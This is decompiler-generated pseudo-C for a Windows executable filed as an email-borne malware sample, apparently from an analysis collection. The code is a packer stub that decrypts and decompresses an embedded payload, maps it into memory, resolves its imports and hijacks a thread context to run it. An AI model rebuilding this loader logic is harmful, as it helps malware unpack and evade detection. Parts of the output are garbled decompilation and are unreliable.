/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0183/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 00401056 -> 00401522 */
/*	Procedure: 0x00401030 - 0x00401083
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    *L004023C0 = 4194304;
    (save)4194304;
    L004013DA();
    (restore)eax;
    L0040136C();
    L00401164();
    (save)0x40105b;
    goto L00401522;
    eax = 0;
    (save)L004010F6( *L004023E8);
    L004011EB( *L004023E4);
    L0040126B();
    L00401250();
    return(L00401528());
}

/*	Procedure: 0x00401084 - 0x00401099
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 8
 */

L00401084(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    asm("rep movsb");
}

/*	Procedure: 0x0040109A - 0x004010F5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 12
 */

L0040109A()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edx = 0;
    edx = 32 / 32 % 32 / 32;
    ebx = *L004023C8 + ( *L004023C4 << 2);
    edi = *L004023E0;
    (save)edi;
    eax = 0;
    do {
        edi = edi - 1;
        esi = *ebx;
        asm("bswap esi");
        cl = dl;
        esi = esi << cl >> 31;
        if(esi != 0) {
            eax = eax + (esi << edi);
        }
        edx = edx + 1;
        if(edx == 32) {
            ebx = ebx + 4;
            edx = 0;
        }
    } while(edi != 0);
    (restore)ecx;
    *L004023C4 = *L004023C4 + ecx;
}

/*	Procedure: 0x004010F6 - 0x00401163
 *	Argument size: 4
 *	Local size: 20
 *	Save regs size: 12
 */

L004010F6(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    ebx = A8 + *(A8 + 60);
    *L004023E4 = *(ebx + 52);
    Vfffffffc = *(ebx + 6) & 255;
    (save)64;
    (save)12288;
    (save) *(ebx + 80);
    (save) *(ebx + 52);
    esi = *__imp__VirtualAlloc();
    L00401084(esi, A8, *(ebx + 84));
    edi = ebx + 248;
    do {
        eax = A8 + *(edi + 20);
        L00401084(esi + *(edi + 12), eax, *(edi + 16));
        edi = edi + 40;
    } while(Vfffffffc = Vfffffffc - 1);
    return(*(ebx + 40) + esi);
}

/*	Procedure: 0x00401164 - 0x004011EA
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 8
 */

L00401164()
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    eax = *L004023C0 + 16384;
    esi = eax + 136;
    ecx = *(eax + 116);
    *L004023D0 = ecx;
    *L004023D4 = *L004023D0 << 3;
    (save)0;
    (save)0;
    (save)1;
    eax = *__imp__HeapCreate();
    *L004023F0 = eax;
    (save) *L004023D0;
    (save)8;
    (save) *L004023F0;
    eax = *__imp__HeapAlloc();
    *L004023C8 = eax;
    *L004023CC = *L004023C8 + *L004023D0;
    eax = L00401084( *L004023C8, esi, *L004023D0);
    edi = *L004023C8;
    ecx = *L004023D0;
    do {
        *edi = *edi - 51;
        edi = edi + 1;
    } while(ecx = ecx - 1);
    *L004023C8 = *L004023C8 + 1;
}

/*	Procedure: 0x004011EB - 0x0040124F
 *	Argument size: 0
 *	Local size: 4
 *	Save regs size: 0
 */

L004011EB(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    asm("pusha");
    esi = 0;
    esi = A8;
    ebx = *( *(esi + 60) + esi + 128) + esi;
    do {
        (save) *(ebx + 12) + A8;
        Vfffffffc = *L00402408();
        esi = *ebx + A8;
        edi = *(ebx + 16) + A8;
        do {
            eax = *__imp__GetProcAddress(Vfffffffc, *esi + A8 + 1 + 1);
            *edi = eax;
            esi = esi + 4;
            edi = edi + 4;
        } while(*esi != 0);
        ebx = ebx + 20;
    } while(*(ebx + 12) != 0);
    asm("popa");
}

/*	Procedure: 0x00401250 - 0x0040126A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401250()
{



    (save)ebx;
    eax = 0;
    == ? L00401256 : ;
    eax = L184d9dbe();
    *eax = *eax + al;
    *(ebx + 495661129) = *(ebx + 495661129) + cl;
    asm("in al,0x23");
    eax = eax + 1;
    *(ecx + -1017444263) = *(ecx + -1017444263) + cl;
}

stack space not deallocated on return
/*	Procedure: 0x0040126B - 0x00401283
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040126B()
{



    *__imp__HeapDestroy();
    return(*__imp__HeapDestroy( *L00402400, *L004023F4));
}

/*	Procedure: 0x00401284 - 0x004012A6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401284()
{
	/* unknown */ void  ebx;



    ebx = *L004023D8;
    ecx = 1 & 255;
    do {
        *ebx = ch;
        *(ebx + 1) = cl;
        ebx = ebx + 160;
    } while(cl = cl + 1);
    *L004023DC = ecx;
}

/*	Procedure: 0x004012A7 - 0x004012D8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L004012A7()
{
	/* unknown */ void  ebx;



    eax = *L004023DC;
    ebx = *L004023D8;
    ecx = 160;
    asm("mul ecx");
    ebx = ebx + eax;
    esi = 4203213;
    *ebx = *L004022CC & 255;
    edi = ebx + 1;
    asm("rep movsb");
    *L004023DC = *L004023DC + 1;
    return(L004012D9());
}

/* DEST BLOCK NOT FOUND: 004012e5 -> 004012fb */
/*	Procedure: 0x004012D9 - 0x004012FB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004012D9()
{



    if(*L004023DC == 512) {
        *L004023DC = 256;
        *L004023E0 = 9;
    }
}

/*	Procedure: 0x004012FC - 0x00401309
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004012FC()
{



    *L00402414 = *L004022CD;
    return(*L00402414);
}

/*	Procedure: 0x0040130A - 0x00401331
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040130A(A8)
/* unknown */ void  A8;
{



    asm("pusha");
    edi = 4203212;
    ebx = *L004023D8;
    ecx = 160;
    asm("mul ecx");
    ebx = ebx + A8;
    ecx = ( *ebx & 255) + 1;
    esi = ebx;
    asm("rep movsb");
    asm("popa");
}

/*	Procedure: 0x00401332 - 0x00401347
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401332()
{
	/* unknown */ void  ebx;



    ebx = 4203212;
    *L004022CC = *L004022CC + 1;
    ebx = ebx + ( *ebx & 255);
    *ebx = *L00402414;
    return(*ebx);
}

/*	Procedure: 0x00401348 - 0x0040136B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401348()
{



    asm("pusha");
    edi = *L004023E8 + *L004023EC;
    *L004023EC = *L004023EC + ( *L004022CC & 255);
    esi = 4203213;
    asm("rep movsb");
    asm("popa");
}

stack space not deallocated on return
/*	Procedure: 0x0040136C - 0x004013D9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040136C()
{



    (save)0;
    (save)4;
    (save)0;
    (save)0x4013d9;
    (save)0;
    (save)0;
    *L004023FC = *__imp__CreateThread();
    *L004023F8 = *L0040240c();
    esi = 4202496;
    *L00402000 = 65538;
    (save)esi;
    (save) *L004023FC;
    *__imp__GetThreadContext();
    *(esi + 176) = 0x40104c;
    *__imp__SetThreadContext();
    *__imp__ResumeThread();
    return(*__imp__SuspendThread( *L004023F8, *L004023FC, *L004023FC, esi));
}

/* DEST BLOCK NOT FOUND: 00401407 -> 64a18358 */
/*	Procedure: 0x004013DA - 0x00401416
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004013DA()
{



    (save)ebp;
    ebp = esp;
    eax = *( *%fs:0x0] + 4) & -65536;
L004013eb:
    eax = eax - 65536;
    if(*eax != 23117) {
        goto L004013eb;
    }
    (save)"LoadLibraryA";
    (save)eax;
    *L00402404 = eax;
    goto "ÿadLibraryA";
    goto L64a18358;
    esp = esp - 1;
    1098478177 = *(edx + 114) * esp;
    *(edi + 101) = *(edi + 101) + al;
}

stack space not deallocated on return
/*	Procedure: 0x00401449 - 0x00401527
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401449()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 16;
    (save)ebx;
    (save)0;
    (save)0;
    (save)1;
    eax = *__imp__HeapCreate();
    *L004023F4 = eax;
    (save)60000;
    (save)8;
    (save)eax;
    *__imp__HeapAlloc();
    *L004023E8 = eax;
    (save)ebx;
    (save)ebx;
    (save)1;
    *__imp__HeapCreate();
    *L00402400 = eax;
    (save)12800000;
    (save)8;
    (save)eax;
    *__imp__HeapAlloc();
    *L004023D8 = eax;
    L00401284();
    *L004023E0 = 9;
    L0040109A();
    *(ebp - 8) = eax;
    L0040130A(eax);
    L00401348();
    for(L004012FC(); *L004023D4 - *L004023C4 >= *L004023E0; *(ebp - 8) = eax) {
        eax = L0040109A();
        *(ebp - 4) = eax;
        if(eax <= *L004023DC - 1) {
            L0040130A( *(ebp - 4));
        } else {
            L0040130A( *(ebp - 8));
            L00401332();
        }
        L00401348();
        L004012FC();
        L0040130A( *(ebp - 8));
        L00401332();
        L004012A7();
        eax = *(ebp - 4);
    }
    (restore)ebx;
    (restore)ebp;
    return;
    return(L00401449());
}

/*	Procedure: 0x00401528 - 0x0040154E
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401528(A8)
/* unknown */ void  A8;
{



    (save)0;
    (save)0;
    (save)0;
    (save)A8;
    (save)0;
    (save)0;
    *__imp__CreateThread();
    return(*__imp__SuspendThread( *L0040240c()));
}

/*	Procedure: 0x0040154F - 0x0040154F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040154F()
{



    asm("int3");
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x00401004       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00401008       0 */ /* unknown */ void 	__imp__GetThreadContext;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x00401010       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x00401014       0 */ /* unknown */ void 	__imp__HeapDestroy;
/* 0x00401018       0 */ /* unknown */ void 	__imp__ResumeThread;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__SetThreadContext;
/* 0x00401020       0 */ /* unknown */ void 	__imp__SuspendThread;
/* 0x00401024       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00401030       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
